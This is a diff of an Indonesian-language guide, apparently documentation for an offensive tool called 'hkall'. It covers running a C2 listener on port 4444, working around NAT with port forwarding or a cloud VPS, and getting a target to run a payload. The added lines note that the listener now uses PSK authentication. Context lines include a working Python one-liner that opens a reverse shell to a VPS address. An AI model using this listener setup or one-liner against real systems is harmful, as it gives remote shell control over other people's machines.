@@ -38,7 +38,7 @@ Solusi: T jalanin payload → payload connect ke A. A jadi listener.
 ```bash
 # buka listener, catat IP publik + port
 curl ifconfig.me          # IP publik attacker (jika punya)
-hkall -m c2 --port 4444    # listener aktif
+hkall -m c2 --port 4444    # listener aktif (PSK auth: data/c2.psk)
 
 # NOTE: kalau attacker di NAT juga (ISP rumah), perlu:
 # Option A: port forwarding di router attacker (DMZ / port 4444 forward)
@@ -76,6 +76,9 @@ VPS = server cloud (DigitalOcean/Vultr/Oracle Free Tier).
 ```bash
 # di VPS: buka listener
 hkall -m c2 --port 4444
+# PENTING: c2 sekarang pakai PSK auth (data/c2.psk di device listener).
+# Target HARUS jalanin payload hasil `hkall -m payload` (PSK embed otomatis).
+# One-liner sederhana di bawah TIDAK bisa auth ke listener PSK.
 
 # di Target T: payload connect ke IP VPS
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<VPS_IP>",4444));[os.dup2(s.fileno(),x) for x in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
